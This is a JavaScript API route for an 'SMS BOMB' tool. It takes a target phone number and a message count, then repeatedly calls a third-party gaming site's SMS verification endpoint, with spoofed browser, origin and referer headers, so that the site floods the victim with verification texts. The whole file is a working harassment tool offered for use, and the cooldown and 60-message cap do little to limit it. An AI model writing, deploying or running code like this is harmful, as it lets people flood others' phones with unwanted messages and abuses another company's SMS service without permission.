const axios = require("axios");

const cooldowns = new Map();

module.exports.routes = {
  name: "SMS BOMB",
  desc: "Send spam SMS to a phone number. Limited to 60 messages with a 20-second cooldown.",
  category: "SMS Tools",
  usages: "/api/smsbomb",
  query: "?phonenum=&spamnum=",
  method: "get",
};

module.exports.onAPI = async (req, res) => {
  const { phonenum, spamnum } = req.query;

  if (!phonenum || !spamnum) {
    return res.status(400).json({ error: "Both 'phonenum' and 'spamnum' parameters are required." });
  }

  const messageCount = parseInt(spamnum, 10);
  if (isNaN(messageCount) || messageCount <= 0 || messageCount > 60) {
    return res.status(400).json({
      error: "Invalid 'spamnum' parameter. Must be a positive integer and not exceed 60.",
    });
  }

  const currentTime = Date.now();
  if (cooldowns.has(phonenum)) {
    const lastUsed = cooldowns.get(phonenum);
    const timeElapsed = (currentTime - lastUsed) / 1000;

    if (timeElapsed < 20) {
      return res.status(429).json({
        error: `Cooldown active. Please wait ${Math.ceil(20 - timeElapsed)} seconds before trying again.`,
      });
    }
  }

  cooldowns.set(phonenum, currentTime);

  const url = "https://api.f5jl55.vip/api/v1/game/smsVerify";
  const headers = {
    "User-Agent":
      "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/json",
    language: "",
    "sec-ch-ua-platform": '"Android"',
    "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    "sec-ch-ua-mobile": "?1",
    web: "https://phgame1.com",
    platform: "h5",
    origin: "https://phgame4.com",
    "sec-fetch-site": "cross-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    referer: "https://phgame4.com/",
    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
    priority: "u=1, i",
  };

  const results = [];

  try {
    for (let i = 0; i < messageCount; i++) {
      const payload = {
        verify_type: "smscode",
        phone: String(phonenum),
      };

      try {
        const response = await axios.post(url, payload, { headers });
        if (response.status === 200) {
          results.push({ attempt: i + 1, status: "success", data: response.data });
        } else {
          results.push({ attempt: i + 1, status: "failed", error: "Unexpected response", code: response.status });
        }
      } catch (error) {
        results.push({
          attempt: i + 1,
          status: "failed",
          error: error.response ? error.response.data : error.message,
        });
      }
    }

    res.json({
      status: "completed",
      message: `Sent ${messageCount} messages to ${phonenum}`,
      results,
    });
  } catch (error) {
    res.status(500).json({
      error: "An error occurred while processing the request.",
      details: error.message,
    });
  }
};
